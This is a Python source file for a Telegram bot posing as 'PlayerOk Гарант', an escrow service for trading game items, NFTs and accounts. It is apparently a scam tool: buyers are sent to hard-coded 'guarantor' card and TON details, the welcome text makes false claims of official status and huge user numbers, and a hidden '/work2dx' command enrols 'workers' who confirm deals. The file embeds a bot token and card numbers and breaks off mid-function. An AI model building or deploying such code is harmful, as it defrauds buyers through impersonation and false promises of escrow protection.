import asyncio
import logging
import sqlite3
import random
import string
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = "8698486408:AAHca06IlTyKa09BRO2nby24_oJUQsDW8vU"  # ВСТАВЬ СВОЙ ТОКЕН
BOT_NAME = "PlayerOk Гарант🔰"

# ========== ССЫЛКА НА ГИФКУ ==========
WELCOME_GIF = "https://i.postimg.cc/3RdLNqkp/0309-1-1.gif"

# ========== РЕКВИЗИТЫ ГАРАНТА ==========
CARD_RUB = "5536 9127 6123 5312"
CARD_USD = "5536 9127 6123 5312"
TON_ADDRESS = "UQAjHsTNWO_NaZXkSuf4gO9r6YSs3zuz_dsDyz4QQ5nIRGQI"
STARS_ACCOUNT = "@PlayerokGarantBota"
ANY_CURRENCY = "5536 9127 6123 5312"

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Настройка SQLite
sqlite3.register_adapter(datetime, lambda dt: dt.isoformat())
sqlite3.register_converter("timestamp", lambda s: datetime.fromisoformat(s.decode()))

def init_db():
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            bio TEXT DEFAULT 'Информация не указана',
            status TEXT DEFAULT 'Новый пользователь',
            rating REAL DEFAULT 5.0,
            successful_deals INTEGER DEFAULT 0,
            total_deals INTEGER DEFAULT 0,
            registration_date TIMESTAMP,
            last_active TIMESTAMP,
            is_verified BOOLEAN DEFAULT FALSE,
            is_worker BOOLEAN DEFAULT FALSE,
            referral_code TEXT UNIQUE,
            referred_by INTEGER DEFAULT NULL,
            referral_count INTEGER DEFAULT 0,
            referral_earnings REAL DEFAULT 0.0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deals (
            id TEXT PRIMARY KEY,
            seller_id INTEGER NOT NULL,
            buyer_id INTEGER DEFAULT NULL,
            item_name TEXT,
            item_category TEXT,
            amount REAL,
            currency TEXT DEFAULT 'RUB',
            status TEXT DEFAULT 'waiting_for_buyer',
            payment_method TEXT,
            seller_details TEXT,  -- Реквизиты продавца
            created_at TIMESTAMP,
            completed_at TIMESTAMP DEFAULT NULL,
            confirmed_by INTEGER DEFAULT NULL,
            FOREIGN KEY (seller_id) REFERENCES users (user_id),
            FOREIGN KEY (buyer_id) REFERENCES users (user_id),
            FOREIGN KEY (confirmed_by) REFERENCES users (user_id)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payment_methods (
            user_id INTEGER PRIMARY KEY,
            rub_card TEXT DEFAULT 'не указано',
            usd_card TEXT DEFAULT 'не указано',
            ton TEXT DEFAULT 'не указано',
            stars TEXT DEFAULT 'не указано',
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("База данных инициализирована")

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def generate_ref_code(user_id):
    return f"ref_{user_id}"

async def register_user(message: Message):
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (message.from_user.id,))
    user = cursor.fetchone()
    if not user:
        ref_code = generate_ref_code(message.from_user.id)
        cursor.execute(
            """INSERT INTO users 
               (user_id, username, first_name, last_name, registration_date, last_active, referral_code, is_worker) 
               VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            (message.from_user.id, message.from_user.username,
             message.from_user.first_name, message.from_user.last_name,
             datetime.now(), datetime.now(), ref_code, False)
        )
        cursor.execute(
            "INSERT INTO payment_methods (user_id) VALUES (?)",
            (message.from_user.id,)
        )
        logger.info(f"Новый пользователь зарегистрирован: {message.from_user.id}")
    else:
        cursor.execute(
            "UPDATE users SET username = ?, first_name = ?, last_name = ?, last_active = ? WHERE user_id = ?",
            (message.from_user.username, message.from_user.first_name,
             message.from_user.last_name, datetime.now(), message.from_user.id)
        )
    conn.commit()
    conn.close()

@dp.message(Command("work2dx"))
async def become_worker(message: Message):
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute("SELECT is_worker FROM users WHERE user_id = ?", (message.from_user.id,))
    result = cursor.fetchone()
    if result and result[0]:
        await message.answer("✅ Вы уже активировали скрытые функции")
    else:
        cursor.execute("UPDATE users SET is_worker = ? WHERE user_id = ?", (True, message.from_user.id))
        conn.commit()
        await message.answer("✅ Доступ активирован\n\nТеперь вы можете подтверждать сделки.")
    conn.close()

async def is_worker(user_id: int) -> bool:
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute("SELECT is_worker FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result and result[0]

def get_guarantor_payment_details(payment_method: str) -> str:
    if "RUB" in payment_method:
        return f"💳 Карта RUB: {CARD_RUB}"
    elif "USD" in payment_method:
        return f"💳 Карта USD: {CARD_USD}"
    elif "TON" in payment_method:
        return f"⬛️ TON кошелек: {TON_ADDRESS}"
    elif "Stars" in payment_method:
        return f"⭐️ Telegram Stars: {STARS_ACCOUNT}"
    else:
        return f"💳 Реквизиты: {ANY_CURRENCY}"

class DealCreation(StatesGroup):
    waiting_for_currency = State()
    waiting_for_seller_details = State()  # Новый шаг для реквизитов продавца
    waiting_for_category = State()
    waiting_for_item_name = State()
    waiting_for_link = State()
    waiting_for_amount = State()

def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Создать сделку", callback_data="create_deal")],
        [
            InlineKeyboardButton(text="👤 Профиль", callback_data="profile"),
            InlineKeyboardButton(text="💳 Мои реквизиты", callback_data="my_payment_methods")
        ],
        [
            InlineKeyboardButton(text="✅ Верификация", callback_data="verification"),
            InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals")
        ],
        [
            InlineKeyboardButton(text="🌐 Язык", callback_data="language"),
            InlineKeyboardButton(text="ℹ️ Подробнее", callback_data="about")
        ],
        [
            InlineKeyboardButton(text="📋 Мои сделки", callback_data="my_deals"),
            InlineKeyboardButton(text="🏪 Маркетплейс", callback_data="marketplace")
        ],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")]
    ])

def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])

def get_currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Банковская карта RUB", callback_data="currency_rub")],
        [InlineKeyboardButton(text="💳 Банковская карта USD", callback_data="currency_usd")],
        [InlineKeyboardButton(text="⬛️ TON", callback_data="currency_ton")],
        [InlineKeyboardButton(text="⭐️ Telegram Stars", callback_data="currency_stars")],
        [InlineKeyboardButton(text="🔄 Любая валюта", callback_data="currency_any")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])

def get_category_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🖼 NFT", callback_data="cat_nft")],
        [InlineKeyboardButton(text="✈️ Telegram", callback_data="cat_telegram")],
        [InlineKeyboardButton(text="🎮 Игры", callback_data="cat_games")],
        [InlineKeyboardButton(text="📢 Каналы", callback_data="cat_channels")],
        [InlineKeyboardButton(text="👤 Аккаунты", callback_data="cat_accounts")],
        [InlineKeyboardButton(text="🛠 Услуги", callback_data="cat_services")],
        [InlineKeyboardButton(text="📦 Другое", callback_data="cat_other")],
        [InlineKeyboardButton(text="🎁 NFT Подарки", callback_data="cat_nft_gifts")],
        [InlineKeyboardButton(text="▶️ Вперёд", callback_data="cat_next")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_currency")]
    ])

def get_skip_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⏭ Пропустить", callback_data="skip_link")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_category")]
    ])

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await register_user(message)
    
    args = message.text.split()
    if len(args) > 1:
        param = args[1]
        if param.startswith("profile"):
            user_id = param.replace("profile", "")
            if user_id.isdigit():
                await show_profile_by_id(message, int(user_id))
                return
        elif param.startswith("ref_"):
            referrer_id = param.replace("ref_", "")
            if referrer_id.isdigit():
                await handle_referral(message, int(referrer_id))
                return
        elif re.match(r'^[a-z0-9]{10}$', param):
            await show_deal_for_buyer(message, param)
            return
    
    welcome_text = (
        f"👋 Добро пожаловать в {BOT_NAME} 👋\n\n"
        f"🏆 ОФИЦИАЛЬНАЯ ПЛАТФОРМА №1 В СНГ 🏆\n\n"
        f"✅ 1 000 000+ довольных пользователей.\n"
        f"✅ 150 000+ успешных сделок.\n"
        f"✅ Активная поддержка (24/7).\n"
        f"✅ Официальное представительство.\n\n"
        f"🔐 ГАРАНТИИ БЕЗОПАСНОСТИ 🔐\n\n"
        f"🔰 Юридическая защита каждой сделки.\n"
        f"🔰 Арбитраж при спорных ситуациях.\n"
        f"🔰 Анонимность данных.\n\n"
        f"⚡️ ПРЕИМУЩЕСТВА ПЛАТФОРМЫ ⚡️\n\n"
        f"🏆 Мгновенные выплаты на любые карты.\n"
        f"🏆 Более 5 млн пользователей.\n"
        f"🏆 Активный арбитраж решающий проблемы.\n"
        f"🏆 Минимальная комиссия.\n\n"
        f"📊 СТАТИСТИКА ПЛАТФОРМЫ 📊\n\n"
        f"🖇 1000+ активных сделок.\n"
        f"🖇 Средний чек: 800-4000₽.\n"
        f"🖇 Общий оборот: $50M.\n"
        f"🖇 Статистика обновляется каждый день.\n\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n"
        f"👇 Выберите нужный раздел ниже: 👇"
    )
    
    try:
        await message.answer_animation(
            WELCOME_GIF,
            caption=welcome_text,
            reply_markup=get_main_keyboard()
        )
    except Exception as e:
        logger.error(f"Ошибка при отправке гифки: {e}")
        await message.answer(welcome_text, reply_markup=get_main_keyboard())

async def handle_referral(message: Message, referrer_id: int):
    if referrer_id == message.from_user.id:
        await message.answer("❌ Нельзя перейти по своей реферальной ссылке")
        return
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (referrer_id,))
    referrer = cursor.fetchone()
    if referrer:
        cursor.execute("UPDATE users SET referred_by = ?, referral_count = referral_count + 1 WHERE user_id = ?", 
                      (message.from_user.id, referrer_id))
        conn.commit()
        await message.answer("✅ Вы перешли по реферальной ссылке!\nПосле первой сделки вы и пригласивший получите бонус.")
    else:
        await message.answer("❌ Реферальная ссылка недействительна")
    conn.close()

# ========== ПРОФИЛЬ ==========
async def show_profile_by_id(message: Message, target_user_id: int):
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (target_user_id,))
    user = cursor.fetchone()
    if not user:
        await message.answer("❌ Профиль не найден")
        conn.close()
        return
    
    cursor.execute("SELECT COUNT(*) FROM deals WHERE seller_id = ? AND status = 'completed'", (target_user_id,))
    seller_completed = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM deals WHERE buyer_id = ? AND status = 'completed'", (target_user_id,))
    buyer_completed = cursor.fetchone()[0]
    
    successful_deals = seller_completed + buyer_completed
    conn.close()
    
    if user[11]:  # is_verified
        status = "✅ Верифицирован"
    elif successful_deals == 0:
        status = "🟢 Новый пользователь"
    elif successful_deals < 5:
        status = "🔵 Начинающий"
    elif successful_deals < 20:
        status = "🟣 Опытный"
    elif successful_deals < 50:
        status = "🟠 Профессионал"
    else:
        status = "🔴 Легенда"
    
    if user[12]:  # is_worker
        status += " 👷‍♂️ Воркер"
    
    stars = "⭐" * 5
    
    profile_text = (
        f"👤 Профиль пользователя\n\n"
        f"Имя: {user[2] or 'Не указано'} {user[3] or ''}\n"
        f"ID: {target_user_id}\n\n"
        f"Статус: {status}\n"
        f"Рейтинг: {stars} (5.0/5.0)\n"
        f"Успешных сделок: {successful_deals}\n\n"
        f"О себе:\n"
        f"{user[4]}\n\n"
        f"Ссылка на профиль:\n"
        f"https://t.me/{(await bot.get_me()).username}?start=profile{target_user_id}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])
    
    await message.answer(profile_text, reply_markup=keyboard)

@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    await show_profile_by_id(callback.message, callback.from_user.id)
    await callback.answer()

# ========== МОИ РЕКВИЗИТЫ ==========
@dp.callback_query(F.data == "my_payment_methods")
async def show_my_payment_methods(callback: CallbackQuery):
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM payment_methods WHERE user_id = ?", (callback.from_user.id,))
    methods = cursor.fetchone()
    conn.close()
    
    if not methods:
        rub = "не указано"
        usd = "не указано"
        ton = "не указано"
        stars = "не указано"
    else:
        rub = methods[1] if methods[1] else "не указано"
        usd = methods[2] if methods[2] else "не указано"
        ton = methods[3] if methods[3] else "не указано"
        stars = methods[4] if methods[4] else "не указано"
    
    text = (
        f"💳 Мои реквизиты для получения выплат\n\n"
        f"🔹 Банковская карта RUB:\n{rub}\n\n"
        f"🔹 Банковская карта USD:\n{usd}\n\n"
        f"🔹 TON кошелек:\n{ton}\n\n"
        f"🔹 Telegram Stars:\n{stars}\n\n"
        f"Чтобы изменить реквизиты, обратитесь в поддержку."
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])
    
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=keyboard)
        else:
            await callback.message.answer(text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=keyboard)
    
    await callback.answer()

# ========== ВЕРИФИКАЦИЯ ==========
@dp.callback_query(F.data == "verification")
async def verification_callback(callback: CallbackQuery):
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute("SELECT is_verified FROM users WHERE user_id = ?", (callback.from_user.id,))
    user = cursor.fetchone()
    cursor.execute("SELECT COUNT(*) FROM deals WHERE seller_id = ? AND status = 'completed'", (callback.from_user.id,))
    completed_deals = cursor.fetchone()[0]
    conn.close()
    
    if user and user[0]:
        status = "✅ Вы уже верифицированы"
    else:
        status = "❌ Не верифицирован"
    
    text = (
        f"✅ ВЕРИФИКАЦИЯ\n\n"
        f"Статус: {status}\n"
        f"Успешных сделок: {completed_deals}\n\n"
        f"Требования для верификации:\n"
        f"• Минимум 5 успешных сделок\n"
        f"• Аккаунт старше 30 дней\n"
        f"• Положительная репутация\n\n"
        f"Для прохождения верификации обратитесь в поддержку."
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])
    
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=keyboard)
        else:
            await callback.message.answer(text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=keyboard)
    
    await callback.answer()

# ========== РЕФЕРАЛЫ ==========
@dp.callback_query(F.data == "referrals")
async def referrals_callback(callback: CallbackQuery):
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute("SELECT referral_code, referral_count, referral_earnings FROM users WHERE user_id = ?", 
                  (callback.from_user.id,))
    user = cursor.fetchone()
    conn.close()
    
    ref_code = user[0] if user else generate_ref_code(callback.from_user.id)
    ref_count = user[1] if user else 0
    ref_earnings = user[2] if user else 0.0
    
    text = (
        f"👥 РЕФЕРАЛЬНАЯ ПРОГРАММА\n\n"
        f"Ваша ссылка:\n"
        f"https://t.me/{(await bot.get_me()).username}?start={ref_code}\n\n"
        f"Приглашено: {ref_count}\n"
        f"Заработано: {ref_earnings}₽\n\n"
        f"За каждого приглашенного друга вы получаете 5% от его комиссии!"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])
    
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=keyboard)
        else:
            await callback.message.answer(text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=keyboard)
    
    await callback.answer()

# ========== ЯЗЫК ==========
@dp.callback_query(F.data == "language")
async def language_callback(callback: CallbackQuery):
    text = (
        f"🌐 ВЫБЕРИТЕ ЯЗЫК\n\n"
        f"🇷🇺 Русский - текущий\n"
        f"🇬🇧 English\n"
        f"🇩🇪 Deutsch\n"
        f"🇫🇷 Français\n"
        f"🇪🇸 Español\n\n"
        f"Выберите язык в настройках Telegram бота."
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])
    
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=keyboard)
        else:
            await callback.message.answer(text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=keyboard)
    
    await callback.answer()

# ========== ПОДРОБНЕЕ ==========
@dp.callback_query(F.data == "about")
async def about_callback(callback: CallbackQuery):
    text = (
        f"ℹ️ О ПЛАТФОРМЕ {BOT_NAME}\n\n"
        f"PlayerOk - официальный гарант-сервис для безопасных сделок.\n\n"
        f"🔹 Работаем с 2022 года\n"
        f"🔹 Более 1 млн пользователей\n"
        f"🔹 150 000+ успешных сделок\n"
        f"🔹 Поддержка 24/7\n\n"
        f"⚙️ **СХЕМА РАБОТЫ:**\n\n"
        f"1️⃣ Продавец создает сделку в боте\n"
        f"2️⃣ Продавец отправляет товар гаранту\n"
        f"3️⃣ Гарант проверяет товар\n"
        f"4️⃣ Покупатель переводит деньги на карту гаранта\n"
        f"5️⃣ Гарант подтверждает оплату\n"
        f"6️⃣ Гарант переводит деньги продавцу\n"
        f"7️⃣ Гарант отправляет товар покупателю\n\n"
        f"✅ **ТОВАР И ДЕНЬГИ ПОД КОНТРОЛЕМ ГАРАНТА**"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])
    
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=keyboard)
        else:
            await callback.message.answer(text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=keyboard)
    
    await callback.answer()  # ← ЭТО БЫЛО НЕ ЗАКРЫТО

# ========== МАРКЕТПЛЕЙС ==========
@dp.callback_query(F.data == "marketplace")
async def marketplace_callback(callback: CallbackQuery):
    text = (
        f"🏪 МАРКЕТПЛЕЙС\n\n"
        f"Популярные категории:\n\n"
        f"• 🎮 Игры - 150+ товаров\n"
        f"• 🖼 NFT - 80+ товаров\n"
        f"• ✈️ Telegram - 200+ товаров\n"
        f"• 👤 Аккаунты - 300+ товаров\n"
        f"• 🛠 Услуги - 120+ товаров\n\n"
        f"Маркетплейс находится в разработке. Скоро здесь появится каталог товаров!"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])
    
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=keyboard)
        else:
            await callback.message.answer(text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=keyboard)
    
    await callback.answer()

# ========== ПОДДЕРЖКА ==========
@dp.callback_query(F.data == "support")
async def support_callback(callback: CallbackQuery):
    text = (
        f"🆘 ПОДДЕРЖКА 24/7\n\n"
        f"По всем вопросам обращайтесь:\n\n"
        f"📧 Email: support@playerok.ru\n"
        f"👤 Telegram: @PlayerOkSupport\n"
        f"📱 Чат: @PlayerOkChat\n\n"
        f"Среднее время ответа: 2 минуты"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Написать в поддержку", url="https://t.me/PlayerOkSupport")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])
    
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=keyboard)
        else:
            await callback.message.answer(text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=keyboard)
    
    await callback.answer()

# ========== СОЗДАНИЕ СДЕЛКИ ==========
@dp.callback_query(F.data == "create_deal")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    text = "Создание сделки\n\nСначала выберите валюту для сделки:"
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=get_currency_keyboard())
        else:
            await callback.message.answer(text, reply_markup=get_currency_keyboard())
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=get_currency_keyboard())
    
    await state.set_state(DealCreation.waiting_for_currency)
    await callback.answer()

@dp.callback_query(DealCreation.waiting_for_currency, F.data.startswith("currency_"))
async def process_currency(callback: CallbackQuery, state: FSMContext):
    currency_map = {
        'currency_rub': 'Банковская карта RUB',
        'currency_usd': 'Банковская карта USD',
        'currency_ton': 'TON',
        'currency_stars': 'Telegram Stars',
        'currency_any': 'Любая валюта'
    }
    currency = currency_map.get(callback.data, 'RUB')
    await state.update_data(currency=currency)
    
    # Запрашиваем реквизиты продавца
    text = (
        f"💳 Введите ваши реквизиты для получения выплат\n\n"
        f"Вы выбрали: {currency}\n\n"
        f"Укажите номер карты/кошелька, на который хотите получить деньги:\n"
        f"(Например: 5536 9127 6123 5312 или @username или TON адрес)"
    )
    
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=get_back_keyboard())
        else:
            await callback.message.answer(text, reply_markup=get_back_keyboard())
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=get_back_keyboard())
    
    await state.set_state(DealCreation.waiting_for_seller_details)
    await callback.answer()

@dp.message(DealCreation.waiting_for_seller_details)
async def get_seller_details(message: Message, state: FSMContext):
    await state.update_data(seller_details=message.text)
    
    text = "Выберите категорию товара:"
    try:
        await message.answer(text, reply_markup=get_category_keyboard())
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await message.answer(text, reply_markup=get_category_keyboard())
    
    await state.set_state(DealCreation.waiting_for_category)

@dp.callback_query(DealCreation.waiting_for_category, F.data.startswith("cat_"))
async def process_category(callback: CallbackQuery, state: FSMContext):
    if callback.data == "cat_next":
        await callback.answer("Дополнительные категории появятся позже")
        return
    
    category_map = {
        'cat_nft': 'NFT',
        'cat_telegram': 'Telegram',
        'cat_games': 'Игры',
        'cat_channels': 'Каналы',
        'cat_accounts': 'Аккаунты',
        'cat_services': 'Услуги',
        'cat_other': 'Другое',
        'cat_nft_gifts': 'NFT Подарки'
    }
    category = category_map.get(callback.data, 'Другое')
    await state.update_data(category=category)
    
    text = "Опишите товар\n\nНапишите краткое описание товара в следующем сообщении.\n\nПример: Telegram Premium 1 месяц"
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=get_back_keyboard())
        else:
            await callback.message.answer(text, reply_markup=get_back_keyboard())
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=get_back_keyboard())
    
    await state.set_state(DealCreation.waiting_for_item_name)
    await callback.answer()

@dp.message(DealCreation.waiting_for_item_name)
async def get_item_name(message: Message, state: FSMContext):
    await state.update_data(item_name=message.text)
    await message.answer(
        "Отправьте ссылку на товар\n\nОтправьте ссылку на товар или нажмите «Пропустить».",
        reply_markup=get_skip_keyboard()
    )
    await state.set_state(DealCreation.waiting_for_link)

@dp.message(DealCreation.waiting_for_link)
async def get_link(message: Message, state: FSMContext):
    await state.update_data(link=message.text)
    await ask_amount(message, state)

@dp.callback_query(DealCreation.waiting_for_link, F.data == "skip_link")
async def skip_link(callback: CallbackQuery, state: FSMContext):
    await state.update_data(link="Не указана")
    await callback.message.delete()
    await ask_amount(callback.message, state)
    await callback.answer()

async def ask_amount(message: Message, state: FSMContext):
    data = await state.get_data()
    currency = data.get('currency', 'RUB')
    currency_code = 'RUB'
    if 'USD' in currency:
        currency_code = 'USD'
    elif 'TON' in currency:
        currency_code = 'TON'
    elif 'Stars' in currency:
        currency_code = 'STARS'
    
    await message.answer(
        f"Укажите сумму сделки\n\nНапишите сумму сделки (например: 1000):\n\nВалюта: {currency_code}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ НАЗАД", callback_data="back_to_main")]
        ])
    )
    await state.set_state(DealCreation.waiting_for_amount)

@dp.message(DealCreation.waiting_for_amount)
async def get_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(',', '.'))
        data = await state.get_data()
        deal_id = generate_deal_id()
        seller_id = message.from_user.id
        
        conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
        cursor = conn.cursor()
        cursor.execute(
            """INSERT INTO deals 
               (id, seller_id, item_name, item_category, amount, currency, payment_method, seller_details, created_at) 
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (deal_id, seller_id, data.get('item_name', 'Товар'),
             data.get('category', 'Другое'), amount,
             data.get('currency', 'RUB'), data.get('currency', 'RUB'),
             data.get('seller_details', 'Не указаны'),
             datetime.now())
        )
        conn.commit()
        conn.close()
        
        bot_username = (await bot.get_me()).username
        deal_link = f"https://t.me/{bot_username}?start={deal_id}"
        
        success_text = (
            f"✅ Сделка создана\n\n"
            f"ID: {deal_id}\n"
            f"Товар: {data.get('item_name', 'Товар')}\n"
            f"Сумма: {amount} {data.get('currency', 'RUB')}\n"
            f"Ваши реквизиты: {data.get('seller_details', 'Не указаны')}\n\n"
            f"🔗 Отправьте эту ссылку покупателю:\n{deal_link}\n\n"
            f"⚠️ Покупатель увидит реквизиты ГАРАНТА для оплаты при переходе по ссылке\n"
            f"⚠️ После подтверждения оплаты воркером вы получите уведомление"
        )
        
        await message.answer(
            success_text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📋 Мои сделки", callback_data="my_deals")],
                [InlineKeyboardButton(text="◀️ В меню", callback_data="back_to_main")]
            ])
        )
    except ValueError:
        await message.answer(
            "❌ Пожалуйста, введите корректную сумму (только цифры).",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="◀️ НАЗАД", callback_data="back_to_main")]
            ])
        )
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await message.answer("❌ Произошла ошибка при создании сделки")
    
    await state.clear()

# ========== ПОКАЗ СДЕЛКИ ПОКУПАТЕЛЮ ==========
async def show_deal_for_buyer(message: Message, deal_id: str):
    logger.info(f"Покупатель {message.from_user.id} перешёл по ссылке сделки {deal_id}")
    
    if await is_worker(message.from_user.id):
        await message.answer("🔧 Режим воркера: используйте команды для подтверждения сделок")
        return
    
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM deals WHERE id = ?", (deal_id,))
    deal = cursor.fetchone()
    
    if not deal:
        await message.answer("❌ Сделка не найдена")
        conn.close()
        return
    
    seller_id = deal[1]
    
    if seller_id == message.from_user.id:
        await message.answer("❌ Это ваша собственная сделка! Вы не можете её оплачивать.")
        conn.close()
        return
    
    payment_method = deal[8]
    guarantor_details = get_guarantor_payment_details(payment_method)
    
    if deal[2] is None:
        cursor.execute("UPDATE deals SET buyer_id = ? WHERE id = ?", (message.from_user.id, deal_id))
        conn.commit()
        
        try:
            seller_notification = (
                f"👤 Покупатель подключился к сделке!\n\n"
                f"Товар: {deal[3]}\n"
                f"Сумма: {deal[5]} {deal[6]}\n"
                f"ID сделки: {deal[0]}\n"
                f"Ваши реквизиты: {deal[9]}\n\n"
                f"После подтверждения оплаты вы получите уведомление"
            )
            await bot.send_message(seller_id, seller_notification)
        except Exception as e:
            logger.error(f"Ошибка уведомления: {e}")
    
    conn.close()
    
    status_text = {
        'waiting_for_buyer': '⏳ Ожидает оплаты',
        'paid': '✅ Оплачено',
        'completed': '🎉 Завершено',
        'cancelled': '❌ Отменено'
    }.get(deal[7], deal[7])
    
    deal_info = (
        f"🔐 Информация о сделке\n\n"
        f"Товар: {deal[3]}\n"
        f"Категория: {deal[4]}\n"
        f"Сумма: {deal[5]} {deal[6]}\n"
        f"ID: {deal[0]}\n"
        f"Статус: {status_text}\n\n"
